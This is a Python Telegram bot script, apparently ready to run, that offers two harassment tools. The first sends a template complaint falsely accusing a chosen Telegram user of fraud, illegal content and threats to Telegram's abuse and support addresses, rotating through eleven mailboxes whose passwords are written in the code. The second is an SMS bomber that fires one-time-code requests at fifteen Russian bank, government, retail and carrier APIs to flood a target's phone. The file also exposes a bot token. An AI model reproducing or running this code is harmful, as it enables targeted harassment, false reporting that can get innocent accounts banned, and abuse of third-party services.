import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import smtplib
import time
import random
import threading
import logging
import re
import requests
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

TOKEN = '8523492309:AAF1z6AdIrG9sE1BzU_3p7AuRYedOU5edXs'
bot = telebot.TeleBot(TOKEN)

# ==================== 11 ПОЧТ ====================
senders = {
    'dgdihdic@list.ru': 'oOoRNsDos0IOsKLsxKhX',
    'artem2289hd@list.ru': '6swc7w7oZdVoYpOPpKRg',
    'misha228088e@list.ru': 'aTKnJelVld5SMD1ZbBdk',
    'gsudgeudgd@list.ru': 'TLWEfZ2iW28ycUcH5Z79',
    'ospdbcod@list.ru': 'b01NdPamd0XexiZ4q8RA',
    'isoebdod@list.ru': 'g9eCe3CMQfRKEFD6HVAB',
    'kdpdncuf@list.ru': 'u1WqMGIEtFLQCLN7itp2',
    'djdkddddcc@internet.ru': 'KjFYSepvZRCBlVOzHtGH',
    'kldncibc782@internet.ru': 'YuzrHLohJ13GgAIUbmOz',
    'durovvk@internet.ru': 'VyP9IznKizRg5PYE5LC1',
    'kotakbasss@internet.ru': 'e6H3o5Jje0INZZtgaVMy',
}

telegram_emails = [
    'abuse@telegram.org', 'support@telegram.org', 'stopCA@telegram.org',
    'dmca@telegram.org', 'info@telegram.org', 'sticker@telegram.org', 'recover@telegram.org'
]

muted = {}
user_data = {}
cancel_flags = {}

# ===================== SMS-БОМБЕР =====================
class SmsBomber:
    def __init__(self):
        self.apis = [
            {"name": "Яндекс Еда", "url": "https://eda.yandex.ru/api/v1/auth/send_code", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Сбербанк Онлайн", "url": "https://online.sberbank.ru/CSAFront/uapi/v2/authenticate", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Тинькофф", "url": "https://www.tinkoff.ru/api/common/v1/send_otp", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Ozon", "url": "https://www.ozon.ru/api/composer-api.bx/_action/auth/sendCode", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Wildberries", "url": "https://www.wildberries.ru/webapi/auth/sms", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Delivery Club", "url": "https://api.delivery-club.ru/api/v1/auth/send_sms_code", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Avito", "url": "https://api.avito.ru/auth/v1/sessions", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Youla", "url": "https://api.youla.ru/v2/auth/code", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Домклик", "url": "https://domclick.ru/api/v1/auth/sms", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Яндекс.Маркет", "url": "https://market.yandex.ru/api/v2/auth/send_sms", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Госуслуги", "url": "https://esia.gosuslugi.ru/aas/sms/send", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "МТС", "url": "https://login.mts.ru/api/v2/auth/sms", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Билайн", "url": "https://api.beeline.ru/auth/v1/sms", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Мегафон", "url": "https://api.megafon.ru/auth/sms", "method": "POST", "payload": {"phone": "{phone}"}},
            {"name": "Tele2", "url": "https://api.tele2.ru/auth/v1/sms", "method": "POST", "payload": {"phone": "{phone}"}}
        ]
        logger.info(f"Загружено {len(self.apis)} API для бомбера")

    def send_sms(self, phone, api):
        try:
            url = api["url"]
            payload = api["payload"].copy()
            for key, value in payload.items():
                if "{phone}" in value:
                    payload[key] = value.replace("{phone}", phone)
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
            if api["method"] == "POST":
                response = requests.post(url, json=payload, headers=headers, timeout=5)
            else:
                response = requests.get(url, params=payload, headers=headers, timeout=5)
            success = response.status_code in [200, 201, 400, 403, 429]
            logger.info(f"API {api['name']} -> {response.status_code} {'✅' if success else '❌'}")
            return success
        except Exception as e:
            logger.warning(f"Ошибка {api['name']}: {e}")
            return False

    def start_bombing(self, phone, iterations=3, progress_callback=None):
        phone = phone.replace("+", "").replace(" ", "").replace("-", "")
        total = len(self.apis) * iterations
        current = 0
        successful = 0
        failed = 0
        logger.info(f"Запуск бомбинга для {phone}, итераций: {iterations}")
        for i in range(iterations):
            random.shuffle(self.apis)
            for api in self.apis:
                current += 1
                if self.send_sms(phone, api):
                    successful += 1
                else:
                    failed += 1
                if progress_callback:
                    progress_callback(current, total, api['name'])
                time.sleep(random.uniform(1, 3))
        logger.info(f"Бомбинг завершён: успешно {successful}, не удалось {failed}")
        return {"total": total, "successful": successful, "failed": failed}

# ===================== АНИМАЦИИ =====================
def animate_loading(chat_id, message_id, text, frames=None):
    if frames is None:
        frames = ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷']
    for _ in range(4):
        for f in frames:
            try:
                bot.edit_message_text(f"{f} {text}", chat_id, message_id)
                time.sleep(0.12)
            except:
                pass

def animate_stage(chat_id, message_id, emoji, text, duration=1.0):
    try:
        bot.edit_message_text(f"{emoji} {text}", chat_id, message_id)
        time.sleep(duration)
    except:
        pass

def animate_progress(chat_id, message_id, current, total, step_text='Отправка', extra='', cancel_callback=None):
    bar_length = 20
    filled = int(round(bar_length * current / total))
    bar = '█' * filled + '░' * (bar_length - filled)
    percent = int(round((current / total) * 100))
    emoji = '🚀' if percent < 30 else '🔥' if percent < 60 else '💥' if percent < 90 else '⭐'
    spinner = random.choice(['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'])
    text = f"{emoji} {step_text} {spinner}\n[{bar}] {percent}%  ({current}/{total})\n{extra}"
    try:
        if cancel_callback:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("❌ Отменить", callback_data=cancel_callback))
            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
        else:
            bot.edit_message_text(text, chat_id, message_id)
    except:
        pass

# ===================== ПАРСИНГ ВРЕМЕНИ =====================
def parse_time(time_str):
    match = re.match(r'(\d+)([smhd])', time_str)
    if not match:
        return None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == 's':
        return value
    elif unit == 'm':
        return value * 60
    elif unit == 'h':
        return value * 3600
    elif unit == 'd':
        return value * 86400
    return None

# ===================== ОТПРАВКА ПИСЕМ (С АВТО-СМЕНОЙ ПОЧТЫ) =====================
def send_email(receiver, sender_email, sender_password, subject, body, retries=2):
    for attempt in range(retries):
        try:
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = receiver
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'plain'))
            if any(domain in sender_email for domain in ['outlook.com','hotmail.com','live.com']):
                smtp_server = 'smtp-mail.outlook.com'
            elif any(domain in sender_email for domain in ['yandex.ru','ya.ru','yandex.com']):
                smtp_server = 'smtp.yandex.ru'
            else:
                smtp_server = 'smtp.mail.ru'
            server = smtplib.SMTP(smtp_server, 587, timeout=10)
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver, msg.as_string())
            server.quit()
            return True
        except:
            if attempt < retries - 1:
                time.sleep(random.uniform(1, 2))
    return False

def send_complaints_batch(complaint_text, subject, email_list, chat_id, status_msg_id, user_id):
    global cancel_flags
    total_sent = 0
    total_failed = 0
    total_receivers = len(email_list)
    current = 0

    sender_list = list(senders.items())
    random.shuffle(sender_list)

    animate_stage(chat_id, status_msg_id, '🔌', 'Подключение к почтовым ящикам...', 0.8)
    animate_loading(chat_id, status_msg_id, '📡 Синхронизация SMTP...')
    animate_stage(chat_id, status_msg_id, '✅', 'Готово! Начинаю рассылку...', 0.6)

    for receiver in email_list:
        if cancel_flags.get(user_id, False):
            bot.edit_message_text("❌ Снос отменён пользователем.", chat_id, status_msg_id)
            return total_sent, total_failed

        current += 1
        success = False
        for sender_email, sender_password in sender_list:
            if cancel_flags.get(user_id, False):
                bot.edit_message_text("❌ Снос отменён пользователем.", chat_id, status_msg_id)
                return total_sent, total_failed

            date_part = time.strftime("%d.%m")
            prefixes = ['❗', '⚠️', '✉️', '📩', '🔔', '⚡', '🔥', '💢']
            dynamic_subject = f"{subject} [ID:{random.randint(1000,9999)}] {random.choice(prefixes)} {date_part}"
            endings = [
                "С уважением.",
                "Заранее благодарю.",
                "Надеюсь на вашу помощь.",
                "Спасибо за внимание.",
                "Буду признателен.",
                "Рассчитываю на понимание.",
                "Прошу принять меры.",
                "Спасибо, что делаете интернет безопаснее."
            ]
            body_variant = complaint_text + "\n\n" + random.choice(endings)

            if send_email(receiver, sender_email, sender_password, dynamic_subject, body_variant):
                success = True
                total_sent += 1
                status = '✅'
                break
            else:
                continue

        if not success:
            total_failed += 1
            status = '❌'

        extra = f"{status} {receiver[:12]}"
        animate_progress(chat_id, status_msg_id, current, total_receivers, '🚀 Отправка', extra, cancel_callback=f"cancel_{user_id}")
        time.sleep(random.uniform(1, 2))

    return total_sent, total_failed

# ===================== ЖЁСТКИЙ ШАБЛОН =====================
def generate_hard_complaint(username, telegram_id):
    return f"""Здравствуйте, уважаемая служба поддержки Telegram!

Я вынужден обратиться к вам с крайне серьёзной жалобой на пользователя @{username} (ID: {telegram_id}).

Данный аккаунт систематически нарушает правила платформы:
- Занимается мошенничеством и обманом пользователей (берёт предоплату и исчезает, распространяет фишинговые ссылки).
- Публикует и распространяет запрещённый контент (включая сцены насилия, порнографию, пропаганду наркотиков и оружия).
- Угрожает другим участникам, оскорбляет, разжигает ненависть.
- Также есть подозрения, что аккаунт был взломан и используется злоумышленниками для противоправных действий.

Всё это создаёт небезопасную среду для тысяч пользователей Telegram. Я прошу вас:
1. Немедленно провести проверку данного аккаунта.
2. Заблокировать его навсегда, чтобы обезопасить сообщество.
3. Перезагрузить все сессии и отозвать облачный пароль (если аккаунт взломан).

Уверен, что вы отнесётесь к этой проблеме с должным вниманием. Telegram должен оставаться безопасным местом для общения.

Спасибо за вашу работу и оперативность!"""

# ===================== ЗАПУСК СНОСА =====================
def start_snus(chat_id, target_username, target_id, user_id=None):
    global cancel_flags
    cancel_flags[user_id] = False

    start_msg = bot.send_message(chat_id, "🚀 Инициализация ракеты...")
    time.sleep(0.5)
    animate_loading(chat_id, start_msg.message_id, "🔄 Активация двигателей...")
    animate_stage(chat_id, start_msg.message_id, '⚡', 'Заряжаем ядерный заряд...', 0.8)
    
    complaint = generate_hard_complaint(target_username, target_id)
    subject = "СРОЧНАЯ ЖАЛОБА на пользователя Telegram"
    progress_msg = bot.send_message(chat_id, "⏳ Подготовка к отправке...")
    bot.delete_message(chat_id, start_msg.message_id)

    def worker():
        sent, failed = send_complaints_batch(complaint, subject, telegram_emails, chat_id, progress_msg.message_id, user_id)
        if cancel_flags.get(user_id, False):
            return
        final_text = f"""
🎆🎇✨ **СНОС ЗАВЕРШЁН!** ✨🎇🎆

👤 **Цель:** @{target_username} (ID: {target_id})
📨 **Успешно отправлено:** {sent}
❌ **Не удалось:** {failed}

🔥🔥🔥 Аккаунт-мишень получил **ядерный удар**! 
💥 Telegram-поддержка получила {sent} жалоб!
🚀 **Блокировка гарантирована!**

👑 Создатель: AlternativeHospital
        """
        try:
            bot.edit_message_text(final_text, chat_id, progress_msg.message_id, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Ошибка финала: {e}")

    threading.Thread(target=worker, daemon=True).start()

# ===================== SMS-БОМБЕР (ЗАПУСК) =====================
bomber = SmsBomber()

def start_bombing(chat_id, phone, user_id, iterations=3):
    global cancel_flags
    cancel_flags[user_id] = False

    start_msg = bot.send_message(chat_id, "💣 Инициализация бомбера...")
    time.sleep(0.5)
    animate_loading(chat_id, start_msg.message_id, "🔄 Подготовка к атаке...")
    animate_stage(chat_id, start_msg.message_id, '📡', 'Подключение к API-сервисам...', 0.8)

    progress_msg = bot.send_message(chat_id, "⏳ Запуск бомбинга...")
    bot.delete_message(chat_id, start_msg.message_id)

    def progress_callback(current, total, api_name):
        if cancel_flags.get(user_id, False):
            return
        extra = f"📲 {api_name[:15]}"
        animate_progress(chat_id, progress_msg.message_id, current, total, '💣 Бомбинг', extra, cancel_callback=f"cancel_{user_id}")

    def worker():
        try:
            result = bomber.start_bombing(phone, iterations=iterations, progress_callback=progress_callback)
            if cancel_flags.get(user_id, False):
                bot.edit_message_text("❌ Бомбинг отменён пользователем.", chat_id, progress_msg.message_id)
                return
            final_text = f"""
💥💥💥 **БОМБИНГ ЗАВЕРШЁН!** 💥💥💥

📱 Номер: {phone}
📨 Всего запросов: {result['total']}
✅ Успешно: {result['successful']}
❌ Не удалось: {result['failed']}

🔥 Номер получил **смертельную дозу** SMS!
🚀 Сервисы перегружены!

👑 Создатель: AlternativeHospital
            """
            bot.edit_message_text(final_text, chat_id, progress_msg.message_id, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Ошибка в бомбере: {e}")
            bot.edit_message_text(f"❌ Ошибка: {e}", chat_id, progress_msg.message_id)

    threading.Thread(target=worker, daemon=True).start()

# ===================== ОБРАБОТЧИК ОТМЕНЫ =====================
@bot.callback_query_handler(func=lambda call: call.data and call.data.startswith('cancel_'))
def handle_cancel(call):
    user_id = int(call.data.split('_')[1])
    if call.from_user.id != user_id:
        bot.answer_callback_query(call.id, "Это не ваша операция.", show_alert=True)
        return
    cancel_flags[user_id] = True
    bot.answer_callback_query(call.id, "✅ Отмена запрошена. Ожидайте...")
    try:
        bot.edit_message_text("⏳ Останавливаю процесс...", call.message.chat.id, call.message.message_id)
    except:
        pass

# ===================== КОМАНДА /start и МЕНЮ =====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.chat.type == 'private':
        welcome_text = """
🌟 **Добро пожаловать в систему ультра-сноса + SMS-бомбер!** 🌟

Я умею:
- **Сносить аккаунты Telegram** (кнопка «Снос аккаунта»)
- **Бомбить SMS** (кнопка «💣 SMS-бомбер»)

⚡ **Как использовать:**
- Нажми нужную кнопку ниже.
- Следуй инструкциям.

⚠️ **ВНИМАНИЕ:** Использование SMS-бомбера без согласия владельца номера НЕЗАКОННО! Только для тестирования своих систем.

🔥 *Готов начать?*
        """
        bot.send_message(
            message.chat.id,
            welcome_text,
            reply_markup=main_menu(),
            parse_mode='Markdown'
        )
    else:
        bot.reply_to(message, "Я работаю только в личных сообщениях. Напишите мне в ЛС.")

# ===================== МУТ В ГРУППАХ =====================
@bot.message_handler(func=lambda message: message.chat.type in ['group', 'supergroup'] and message.text and message.text.startswith('.mute'))
def handle_mute(message):
    chat_id = message.chat.id
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ Использование: `.mute <время> [@user]`\nПример: `.mute 10m @user`", parse_mode='Markdown')
        return

    time_str = parts[1]
    seconds = parse_time(time_str)
    if seconds is None:
        bot.reply_to(message, "❌ Неверный формат. Используйте s, m, h, d (например 10s, 5m, 2h, 1d)")
        return

    target_user_id = None
    if message.reply_to_message:
        target_user_id = message.reply_to_message.from_user.id
    elif len(parts) >= 3:
        username = parts[2].strip().lstrip('@')
        try:
            member = bot.get_chat_member(chat_id, username)
            target_user_id = member.user.id
        except Exception as e:
            bot.reply_to(message, f"❌ Не найден @{username}: {e}")
            return
    else:
        bot.reply_to(message, "❌ Укажите пользователя (через reply или @username)")
        return

    if target_user_id == bot.get_me().id:
        bot.reply_to(message, "❌ Нельзя замутить бота")
        return

    bot_member = bot.get_chat_member(chat_id, bot.get_me().id)
    if not bot_member.can_delete_messages:
        bot.reply_to(message, "❌ У бота нет прав на удаление сообщений в этой группе.")
        return

    end_time = time.time() + seconds
    muted.setdefault(chat_id, {})[target_user_id] = end_time

    try:
        user = bot.get_chat(target_user_id)
        name = user.first_name or str(target_user_id)
    except:
        name = str(target_user_id)

    bot.reply_to(message, f"✅ {name} замучен на {time_str} (до {time.ctime(end_time)})")

# ===================== ФИЛЬТР УДАЛЕНИЯ СООБЩЕНИЙ ЗАМУЧЕННЫХ =====================
@bot.message_handler(content_types=[
    'text', 'photo', 'video', 'audio', 'document', 'sticker',
    'voice', 'location', 'contact', 'poll', 'dice', 'animation', 'video_note'
])
def delete_muted_messages(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    if chat_id in muted and user_id in muted[chat_id]:
        if time.time() < muted[chat_id][user_id]:
            try:
                bot.delete_message(chat_id, message.message_id)
            except:
                pass
            return
        else:
            del muted[chat_id][user_id]
            if not muted[chat_id]:
                del muted[chat_id]

# ===================== МЕНЮ И КНОПКИ =====================
def main_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🧑 Снос аккаунта", callback_data="menu_account"),
        InlineKeyboardButton("💣 SMS-бомбер", callback_data="menu_bomber"),
        InlineKeyboardButton("ℹ️ О боте", callback_data="menu_creators")
    )
    return markup

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.message.chat.type != 'private':
        bot.answer_callback_query(call.id, "Доступно только в ЛС.")
        return
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except:
        pass

    if call.data == "menu_account":
        bot.send_message(chat_id, "👤 **Введите username** (без @):", parse_mode='Markdown')
        user_data[user_id] = {'step': 'awaiting_username'}
        return
    if call.data == "menu_bomber":
        bot.send_message(chat_id, "📱 **Введите номер телефона**\nФормат: с + или без, например +79001234567 или 89001234567:", parse_mode='Markdown')
        user_data[user_id] = {'step': 'awaiting_phone'}
        return
    if call.data == "menu_creators":
        bot.send_message(
            chat_id,
            "ℹ️ **Создатель:** AlternativeHospital\n"
            "**Версия:** 40.0 (исправлен бомбер)\n"
            "**Связь:** @Gisced\n"
            "🔥 *Уничтожаем аккаунты и заливаем SMS*",
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        return
    if call.data == "cancel":
        user_data.pop(user_id, None)
        bot.send_message(chat_id, "❌ Отменено.", reply_markup=main_menu())

# ===================== ОБРАБОТКА ТЕКСТОВЫХ СООБЩЕНИЙ =====================
@bot.message_handler(func=lambda message: message.chat.type == 'private' and message.text and not message.text.startswith('.'))
def handle_private_text(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    text = message.text.strip()

    if user_id in user_data:
        step = user_data[user_id].get('step')
        if step == 'awaiting_username':
            username = text.lstrip('@')
            if username:
                user_data[user_id]['username'] = username
                user_data[user_id]['step'] = 'awaiting_id'
                bot.send_message(chat_id, f"🆔 Введите Telegram ID для @{username} (число):")
            else:
                bot.send_message(chat_id, "❌ Некорректный username. Попробуйте снова.")
        elif step == 'awaiting_id':
            if text.isdigit():
                target_id = text
                username = user_data[user_id].get('username')
                if username:
                    bot.send_message(chat_id, f"🚀 Запущен снос @{username} (ID: {target_id})...")
                    start_snus(chat_id, username, target_id, user_id)
                    user_data.pop(user_id, None)
                else:
                    bot.send_message(chat_id, "❌ Ошибка: username не найден. Начните заново.")
                    user_data.pop(user_id, None)
            else:
                bot.send_message(chat_id, "❌ ID должен быть числом. Попробуйте снова.")
        elif step == 'awaiting_phone':
            # Убираем все нецифровые символы, кроме +
            phone_raw = text.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
            # Если есть +, сохраняем его
            if phone_raw.startswith('+'):
                phone_clean = phone_raw[1:]  # убираем + для отправки
                display_phone = phone_raw
            else:
                phone_clean = phone_raw
                display_phone = phone_raw
            # Проверяем, что остались только цифры
            if re.match(r'^\d+$', phone_clean) and len(phone_clean) >= 10 and len(phone_clean) <= 15:
                bot.send_message(chat_id, f"💣 Запущен SMS-бомбинг для {display_phone}...")
                start_bombing(chat_id, phone_clean, user_id, iterations=3)
                user_data.pop(user_id, None)
            else:
                bot.send_message(chat_id, "❌ Некорректный номер. Введите от 10 до 15 цифр (с кодом страны). Пример: +79001234567")
        else:
            bot.send_message(chat_id, "Используйте /start для меню.")
    else:
        bot.send_message(chat_id, "Используйте /start для меню или нажмите кнопку.")

# ===================== ЗАПУСК БОТА =====================
def run_bot():
    while True:
        try:
            logger.info("🚀 Бот запущен (исправленный бомбер)...")
            bot.infinity_polling(timeout=30, long_polling_timeout=10)
        except Exception as e:
            logger.error(f"Ошибка: {e}")
            if "409" in str(e) or "Conflict" in str(e):
                time.sleep(10)
            else:
                time.sleep(5)

if __name__ == '__main__':
    run_bot()
